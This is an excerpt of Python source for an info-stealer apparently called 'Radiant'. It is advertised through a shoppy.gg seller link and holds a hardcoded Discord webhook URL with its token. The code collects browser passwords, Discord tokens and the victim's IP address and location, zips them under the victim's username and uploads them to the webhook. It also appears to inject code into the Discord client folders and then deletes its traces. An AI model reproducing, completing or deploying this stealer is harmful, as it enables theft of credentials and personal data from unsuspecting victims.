...
WEBHOOK_URL = "https://discord.com/api/webhooks/947595287919231078/KdlSlO7ukE2FKF_DYzAlKNhuckK77Pu979tbImcJ3tPHinyWPCVCK26hpt_iE_abznVO"

def main(webhook_url):
    global webhook, embed

    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Radiant Infiltred", color=000000)
    ...
    embed.set_author(name=f"Date: {strftime('%D | %H:%M:%S', localtime())}")
    embed.set_footer(text="Suley & Portu | Radiant Shoppy")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/977916396686151690/978342143561199626/static.png")

    zipup()
        
    file = None
    file = File(f'DualInfected-{os.getenv("UserName")}.zip')
    
    webhook.send(content="||@here|| <https://shoppy.gg/@Portu>", embed=embed, file=file, avatar_url="https://cdn.discordapp.com/attachments/977916396686151690/978342143561199626/static.png", username="Radiant Devs")
...
def get_loc():
    ...
    try:
        ...
        embed.add_field(name="🤓  WHOIS INFO", value=f"IP: {ip}\n\nORG: {org}\n\nLocation: [{loc}]({googlemap})\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}") 
    except:
        pass
...
class grabtokens():
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\RadiantShop"
...
def zipup():
    with ZipFile(f'DualInfected-{os.getenv("UserName")}.zip', 'w') as zipf:
...
def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  ...
                  os.remove(f"DualInfected-{os.getenv('UserName')}.zip")]:
        ...
        if 'discord' in _dir.lower():
            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
                if match(r'app-(\d*\.\d*)*', __dir):
                    ...
                    f = requests.get("").text.replace("%WEBHOOK%", webhook_url)
